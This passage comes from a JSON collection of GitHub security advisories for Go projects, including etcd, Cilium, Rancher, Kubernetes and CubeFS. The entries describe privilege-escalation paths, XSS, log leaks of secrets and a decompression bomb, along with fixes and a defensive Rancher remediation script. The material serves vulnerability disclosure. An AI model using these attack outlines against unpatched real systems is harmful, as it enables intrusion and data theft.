"details": "Authentication vulnerability found in Etcd-io v.3.4.10 allows remote attackers to escalate privileges via the debug function.\n\nThis has been fixed in v.[3.5.8](https://github.com/etcd-io/etcd/blob/main/CHANGELOG/CHANGELOG-3.5.md#etcd-server) and was also backported to [3.4](https://github.com/etcd-io/etcd/pull/15655) and [3.5](https://github.com/etcd-io/etcd/pull/15653).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd/v3"}, "versions": ["3.4.10"]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-28235"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/pull/15648"}, {"type": "PACKAGE", "url": "https://github.com/etcd-io/etcd"}, {"type": "WEB", "url": "https://github.com/lucyxss/etcd-3.4.10-test/blob/master/temp4cj.png"}, {"type": "WEB", "url": "https://github.com/lucyxss/etcd-3.4.10-test/blob/master/temp4cj_2.png"}, {"type": "WEB", "url": "http://etcd.com"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-04-11T21:32:54Z", "nvd_published_at": "2023-04-04T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pg5p-wwp8-97g8", "modified": "2023-04-19T18:16:51Z", "published": "2023-04-19T18:16:51Z", "aliases": ["CVE-2023-29002"], "summary": "Debug mode leaks confidential data in Cilium", "details": "### Impact\n\nWhen run in debug mode, Cilium may log sensitive information.\n\nIn particular, Cilium running in debug mode will log the values of headers if they match HTTP network policy rules. This issue affects Cilium versions:\n\n- 1.7.* to 1.10.* inclusive\n- 1.11.* before 1.11.16\n- 1.12.* before 1.12.9\n- 1.13.* before 1.13.2\n\nIn addition, Cilium 1.12.* before 1.12.9 and 1.13.* before 1.13.2., when running in debug mode, might log secrets used by the Cilium agent. This includes TLS private keys for Ingress and GatewayAPI resources, depending on the configuration of the affected cluster. Output of the confidential data would occur at Cilium agent restart, when the secrets are modified, and on creation of Ingress or GatewayAPI resources.\n\n### Patches\n\nThis vulnerability is fixed in Cilium releases 1.11.16, 1.12.9, and 1.13.2.\n\n### Workarounds\nDisable debug mode.\n\n### Acknowledgements\nThe Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @meyskens for investigating and fixing the issue.\n\n### For more information\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: [security@cilium.io](mailto:security@cilium.io) - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"last_affected": "1.10.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.16"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cilium/cilium/security/advisories/GHSA-pg5p-wwp8-97g8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29002"}, {"type": "PACKAGE", "url": "https://github.com/cilium/cilium"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-04-19T18:16:51Z", "nvd_published_at": "2023-04-18T22:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-833c-xh79-p429", "modified": "2023-04-24T15:57:13Z", "published": "2023-04-21T19:42:10Z", "aliases": ["CVE-2023-30622"], "summary": "A potential risk in clusternet which can be leveraged to make a cluster-level privilege escalation", "details": "## Summary:\nA potential risk in clusternet which can be leveraged to make a cluster-level privilege escalation.\n## Detailed analysis:\nThe clusternet has a deployment called cluster-hub inside the clusternet-system Kubernetes namespace, which runs on worker nodes\nrandomly. The deployment has a service account called clusternet-hub, which has a cluster role called clusternet:hub via cluster role binding. The clusternet:hub cluster role has \"*\" verbs of \"*.*\" resources. Thus, if a malicious user can access the worker node which runs the clusternet, he/she can leverage the service account to do malicious actions to critical system resources. For example, he/she can leverage the service account to get ALL secrets in the entire cluster, resulting in cluster-level privilege escalation.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/clusternet/clusternet"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.15.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/clusternet/clusternet/security/advisories/GHSA-833c-xh79-p429"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30622"}, {"type": "PACKAGE", "url": "https://github.com/clusternet/clusternet"}, {"type": "WEB", "url": "https://github.com/clusternet/clusternet/releases/tag/v0.15.2"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-04-21T19:42:10Z", "nvd_published_at": "2023-04-24T16:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-65v8-6pvw-jwvq", "modified": "2023-04-19T17:11:40Z", "published": "2023-04-11T12:30:26Z", "aliases": ["CVE-2023-1975"], "summary": "Answer vulnerable to Insertion of Sensitive Information Into Sent Data", "details": "answerdev/answer is an open-source knowledge-based community software. Answer prior to 1.0.8 does not strip EXIF geolocation data from user-uploaded logos. As a result, anyone can get sensitive information like a user's device ID, geolocation, system information, system version, etc.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.8"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1975"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/ac3f2f047ee00b4edaea7530e570ab67ff87cd6a"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/829cab7a-4ed7-465c-aa96-29f4f73dbfff"}], "database_specific": {"cwe_ids": ["CWE-201"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-04-11T21:32:32Z", "nvd_published_at": "2023-04-11T10:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f7rp-xx67-4pj9", "modified": "2023-04-10T22:37:26Z", "published": "2023-04-04T15:30:28Z", "aliases": ["CVE-2020-19277"], "summary": "Phachon mm-wiki vulnerable to stored cross-site scripting (XSS)", "details": "Phachon mm-wiki v.0.1.2 vulnerable to stored cross-site scripting (XSS). This could allow a remote attacker to execute arbitrary code via JavaScript code in the markdown editor. Any user browsing the document containing XSS malicious code will trigger the vulnerability.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/phachon/mm-wiki"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.1.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-19277"}, {"type": "WEB", "url": "https://github.com/phachon/mm-wiki/issues/68"}, {"type": "PACKAGE", "url": "https://github.com/phachon/mm-wiki"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-04-05T19:27:22Z", "nvd_published_at": "2023-04-04T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6m9f-pj6w-w87g", "modified": "2023-04-25T18:09:03Z", "published": "2023-04-24T22:34:59Z", "aliases": ["CVE-2023-22651"], "summary": "Rancher Webhook is misconfigured during upgrade process", "details": "### Impact\n\nA failure in the update logic of Rancher's admission Webhook may lead to the misconfiguration of the Webhook. This component enforces validation rules and security checks before resources are admitted into the Kubernetes cluster.\n\nWhen the Webhook is operating in a degraded state, it no longer validates any resources, which may result in severe privilege escalations and data corruption.\n\nThe issue only affects users that upgrade from `2.6.x` or `2.7.x` to `2.7.2`. Users that did a fresh install of 2.7.2 (and did not follow an upgrade path) are not affected.\n\nThe command below can be executed on the `local` cluster to determine whether the cluster is affected by this issue:\n\n```sh\n$ kubectl get validatingwebhookconfigurations.admissionregistration.k8s.io rancher.cattle.io\n\nNAME                WEBHOOKS   AGE\nrancher.cattle.io   0         19h\n```\n\nIf the resulting webhook quantity is `0`, the Rancher instance is affected.\n\n### Patches\n\nPatched versions include release `2.7.3` and later versions.\n\n### Workarounds\n\nIf you are affected and cannot update to a patched Rancher version, the recommended workaround is to manually reconfigure the Webhook with the script below. Please note that the script must be run from inside the `local` cluster or with a kubeconfig pointing to the `local` cluster which has admin permissions.\n\n```yaml\n#!/bin/bash\n\nset -euo pipefail\n\nfunction prereqs() {\n    if ! [ -x \"$(command -v kubectl)\" ]; then\n      echo \"error: kubectl is not installed.\" >&2\n      exit 1\n    fi\n\n    if [[ -z \"$(kubectl config view -o jsonpath='{.clusters[].cluster.server}')\" ]]; then\n        echo \"error: No kubernetes cluster found on kubeconfig.\" >&2\n        exit 1\n    fi\n}\n\nfunction restart_deployment(){\n    kubectl rollout restart deployment rancher-webhook -n cattle-system\n    kubectl rollout status deployment rancher-webhook -n cattle-system --timeout=30s\n}\n\nfunction workaround() {\n    echo \"Cluster: $(kubectl config view -o jsonpath='{.clusters[].cluster.server}')\"\n\n    if ! kubectl get validatingwebhookconfigurations.admissionregistration.k8s.io rancher.cattle.io > /dev/null 2>&1; then\n        echo \"webhook rancher.cattle.io not found, restarting deployment:\"\n        restart_deployment\n\n        echo \"waiting for webhook configuration\"\n        sleep 15s\n    fi\n\n    local -i webhooks\n    webhooks=\"$(kubectl get validatingwebhookconfigurations.admissionregistration.k8s.io rancher.cattle.io --no-headers | awk '{ print $2 }')\"\n\n    if [ \"${webhooks}\" == \"0\" ]; then\n        echo \"Webhook misconfiguration status: Cluster is affected by CVE-2023-22651\"\n        \n        echo \"Running workaround:\"\n        kubectl delete validatingwebhookconfiguration rancher.cattle.io\n        restart_deployment\n\n        ret=$?\n        if [ $ret -eq 0 ]; then\n            echo \"Webhook restored, CVE-2023-22651 is fixed\"\n        else\n            echo \"error trying to restart deployment. try again in a few seconds.\"\n        fi\n    else\n        echo \"Webhook misconfiguration status: not present (skipping)\"\n    fi\n\n    echo \"Done\"\n}\n\nfunction main() {\n    prereqs\n    workaround\n}\n\nmain\n```\n\n### References\n- https://github.com/rancher/webhook/pull/216/commits/a4a498613b43a3ee93c5ab06742a3bc8adace45d\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n- Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.7.2"}, {"fixed": "2.7.3"}]}], "versions": ["2.7.2"]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rancher/security/advisories/GHSA-6m9f-pj6w-w87g"}, {"type": "PACKAGE", "url": "https://github.com/rancher/rancher"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/releases/tag/v2.7.3"}], "database_specific": {"cwe_ids": [], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-04-24T22:34:59Z", "nvd_published_at": "2023-05-04T08:15:22Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8jg3-rx43-3fv4", "modified": "2023-04-19T17:11:07Z", "published": "2023-04-11T12:30:26Z", "aliases": ["CVE-2023-1974"], "summary": "Answer vulnerable to Exposure of Sensitive Information Through Metadata", "details": "answerdev/answer is an open-source knowledge-based community software. Answer prior to 1.0.8 may expose sensitive information, such as EXIF data and GPS coordatinates, via image metadata.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.8"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1974"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/ac3f2f047ee00b4edaea7530e570ab67ff87cd6a"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/852781c6-9cc8-4d25-9336-bf3cb8ee3439"}], "database_specific": {"cwe_ids": ["CWE-1230"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-04-11T21:31:50Z", "nvd_published_at": "2023-04-11T10:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9337-8c6c-c2xg", "modified": "2023-04-20T14:15:51Z", "published": "2023-04-12T06:30:22Z", "aliases": ["CVE-2023-30512"], "summary": "CubeFS allows Kubernetes cluster-level privilege escalation", "details": "CubeFS through 3.2.1 allows Kubernetes cluster-level privilege escalation. This occurs because DaemonSet has cfs-csi-cluster-role and can thus list all secrets, including the admin secret.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cubefs/cubefs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "3.2.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30512"}, {"type": "WEB", "url": "https://github.com/cubefs/cubefs/issues/1882"}, {"type": "PACKAGE", "url": "https://github.com/cubefs/cubefs"}], "database_specific": {"cwe_ids": ["CWE-732"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-04-12T20:40:15Z", "nvd_published_at": "2023-04-12T06:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2394-5535-8j88", "modified": "2023-03-10T22:38:21Z", "published": "2023-03-01T21:30:18Z", "aliases": ["CVE-2022-3162"], "summary": "Kubernetes vulnerable to path traversal", "details": "Users authorized to list or watch one type of namespaced custom resource cluster-wide can read custom resources of a different type in the same API group without authorization. Clusters are impacted by this vulnerability if all of the following are true: 1. There are 2+ CustomResourceDefinitions sharing the same API group 2. Users have cluster-wide list or watch authorization on one of those custom resources. 3. The same users are not authorized to read another custom resource in the same API group.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.25.0"}, {"fixed": "1.25.4"}]}], "database_specific": {"last_known_affected_version_range": "< 1.25.3"}}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.24.0"}, {"fixed": "1.24.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.23.0"}, {"fixed": "1.23.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.22.0"}, {"fixed": "1.22.16"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-3162"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/113756"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/iUd550j7kjA"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230511-0004/"}], "database_specific": {"cwe_ids": ["CWE-22", "CWE-23"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-10T22:38:21Z", "nvd_published_at": "2023-03-01T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6w5f-5wgr-qjg5", "modified": "2023-03-09T20:21:36Z", "published": "2023-03-09T20:21:36Z", "aliases": [], "summary": "Constellation allows Emergency shell access during initramfs boot phase", "details": "### Impact\n\nAn active attacker could let the boot fail on purpose in the initramfs, dropping the serial console into an emergency shell. This gives attackers with access to the serial console full control over the VM.\n\n### Patches\n\nThe issue has been patched in [v2.6.0](https://github.com/edgelesssys/constellation/releases/tag/v2.6.0).\n\n### Workarounds\n\nnone\n\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/edgelesssys/constellation/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.6.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/edgelesssys/constellation/security/advisories/GHSA-6w5f-5wgr-qjg5"}, {"type": "PACKAGE", "url": "https://github.com/edgelesssys/constellation"}, {"type": "WEB", "url": "https://github.com/edgelesssys/constellation/releases/tag/v2.6.0"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-09T20:21:36Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-4hc4-pgfx-3mrx", "modified": "2023-03-17T21:38:36Z", "published": "2023-03-17T18:20:46Z", "aliases": ["CVE-2023-27593"], "summary": "cilium-agent container can access the host via `hostPath` mount", "details": "### Impact\n\nAn attacker with access to a Cilium agent pod can write to `/opt/cni/bin` due to a `hostPath` mount of that directory in the agent pod. By replacing the CNI binary with their own malicious binary and waiting for the creation of a new pod on the node, the attacker can gain access to the underlying node. \n\n### Patches\n\nThe issue has been fixed and is available on versions >=1.11.15, >=1.12.8, >=1.13.1.\n\n### Workarounds\n\n[Kubernetes RBAC](https://kubernetes.io/docs/reference/access-authn-authz/rbac/) should be used to deny users and service accounts `exec` access to Cilium agent pods.\n\nIn cases where a user requires `exec` access to Cilium agent pods, but should not have access to the underlying node, no workaround is possible.\n\n### References\n\n* [PR containing resolution](https://github.com/cilium/cilium/pull/24075)\n\n### Acknowledgements\n\nThe Cilium community has worked together with members of Isovalent and Form3 to prepare these mitigations. Special thanks to Anastasios Koutlis, Daniel Teixeira, and Magdalena Oczadly for their cooperation. \n\n### For more information\n\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: security@cilium.io - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority. ", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.11.15"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-27593"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/pull/24075"}, {"type": "PACKAGE", "url": "https://github.com/cilium/cilium"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.11.15"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.12.8"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.13.1"}, {"type": "WEB", "url": "https://kubernetes.io/docs/reference/access-authn-authz/rbac/"}], "database_specific": {"cwe_ids": ["CWE-276"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-17T18:20:46Z", "nvd_published_at": "2023-03-17T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9f95-hhg4-pg4f", "modified": "2023-03-10T15:32:35Z", "published": "2023-03-01T19:19:43Z", "aliases": ["CVE-2023-26046"], "summary": "teler-waf subject to Bypass of Common Web Attack Threat Rule with HTML Entities Payload", "details": "### Description\n\nteler-waf is a Go HTTP middleware that provides teler IDS functionality to protect against web-based attacks. Versions prior to v0.1.1 are vulnerable to bypassing common web attack rules when a specific HTML entities payload is used. This vulnerability allows an attacker to execute arbitrary JavaScript code on the victim's browser and compromise the security of the web application. The vulnerability exists due to teler-waf failure to properly sanitize and filter HTML entities in user input.\n\n### Impact\n\nAn attacker can exploit this vulnerability to bypass common web attack threat rules in teler-waf and launch cross-site scripting (XSS) attacks. The attacker can execute arbitrary JavaScript code on the victim's browser and steal sensitive information, such as login credentials and session tokens, or take control of the victim's browser and perform malicious actions.\n\n### Patches\n\nVersion [v0.1.1](https://github.com/kitabisa/teler-waf/releases/tag/v0.1.1) includes a patch for this vulnerability.\n\n### Workarounds\n\nWe advised updating their installations to version `v0.1.1` and frontwards immediately.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kitabisa/teler-waf"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.1.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kitabisa/teler-waf/security/advisories/GHSA-9f95-hhg4-pg4f"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-26046"}, {"type": "WEB", "url": "https://github.com/kitabisa/teler-waf/commit/d1d49cfddfa3ec2adad962870f14b85cd1aaf739"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-9f95-hhg4-pg4f"}, {"type": "PACKAGE", "url": "https://github.com/kitabisa/teler-waf"}, {"type": "WEB", "url": "https://github.com/kitabisa/teler-waf/compare/v0.1.0...v0.1.1"}, {"type": "WEB", "url": "https://github.com/kitabisa/teler-waf/releases/tag/v0.1.1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1597"}], "database_specific": {"cwe_ids": ["CWE-79", "CWE-80"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-01T19:19:43Z", "nvd_published_at": "2023-03-02T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5mqj-xc49-246p", "modified": "2023-03-22T21:49:43Z", "published": "2023-03-22T21:23:25Z", "aliases": ["CVE-2023-28119"], "summary": "crewjam/saml vulnerable to Denial Of Service Via Deflate Decompression Bomb", "details": "Our use of flate.NewReader does not limit the size of the input. The user could pass more than 1 MB of data in the HTTP request to the processing functions, which will be decompressed server-side using the Deflate algorithm. Therefore, after repeating the same request multiple times, it is possible to achieve a reliable crash since the operating system kills the process.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/crewjam/saml"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.13"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/crewjam/saml/security/advisories/GHSA-5mqj-xc49-246p"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28119"}, {"type": "WEB", "url": "https://github.com/crewjam/saml/commit/8e9236867d176ad6338c870a84e2039aef8a5021"}, {"type": "PACKAGE", "url": "https://github.com/crewjam/saml"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-22T21:23:25Z", "nvd_published_at": "2023-03-22T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pmhg-cmjc-3875", "modified": "2023-03-23T18:22:43Z", "published": "2023-03-18T21:30:23Z", "aliases": ["CVE-2023-28609"], "summary": "Ansible Semaphore mishandles authentication", "details": "api/auth.go in Ansible Semaphore before 2.8.89 mishandles authentication.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ansible-semaphore/semaphore"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.8.89"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28609"}, {"type": "WEB", "url": "https://github.com/ansible-semaphore/semaphore/commit/3e4a62b7f2b1ef0660c9fb839818a53c80a5a8b1"}, {"type": "PACKAGE", "url": "https://github.com/ansible-semaphore/semaphore"}, {"type": "WEB", "url": "https://github.com/ansible-semaphore/semaphore/releases/tag/v2.8.89"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-03-20T21:14:43Z", "nvd_published_at": "2023-03-18T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6f27-3p6c-p5jc", "modified": "2023-03-22T21:49:33Z", "published": "2023-03-21T22:30:43Z", "aliases": ["CVE-2023-28114"], "summary": "`cilium-cli` disables etcd authorization for clustermesh clusters", "details": "### Impact\n\n`cilium-cli`, when used to configure cluster mesh functionality, can remove the enforcement of user permissions on the `etcd` store used to mirror local cluster information to remote clusters. \n\nDue to an incorrect mount point specification, the settings specified by the `initContainer` that configures `etcd` users and their permissions are overwritten when using `cilium-cli` to configure a cluster mesh. An attacker who has already gained access to a valid key and certificate for an `etcd` cluster compromised in this manner could then modify state in that `etcd` cluster.\n\n### Patches\n\nThis issue is patched in `cilium-cli` 0.13.2\n\nAll previous versions of `cilium-cli` are affected. Users who have set up cluster meshes using the Cilium Helm chart are not affected.\n\n### Workarounds\n\nUse Cilium's [Helm charts](https://artifacthub.io/packages/helm/cilium/cilium) to create your cluster instead.\n\n### Acknowledgements\n\nThe Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to Marco Iorio for investigating and fixing the issue.\n\n### For more information\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: [security@cilium.io](mailto:security@cilium.io) - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium-cli"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.13.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cilium/cilium-cli/security/advisories/GHSA-6f27-3p6c-p5jc"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28114"}, {"type": "WEB", "url": "https://github.com/cilium/cilium-cli/commit/fb1427025764e1eebc4a7710d902c4f22cae2610"}, {"type": "WEB", "url": "https://artifacthub.io/packages/helm/cilium/cilium"}, {"type": "PACKAGE", "url": "https://github.com/cilium/cilium-cli"}, {"type": "WEB", "url": "https://github.com/cilium/cilium-cli/releases/tag/v0.13.2"}], "database_specific": {"cwe_ids": ["CWE-280"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-21T22:30:43Z", "nvd_published_at": "2023-03-22T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5w78-v688-cx9q", "modified": "2023-03-13T15:32:35Z", "published": "2023-03-07T09:30:30Z", "aliases": ["CVE-2023-1238"], "summary": "Answer vulnerable to Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": 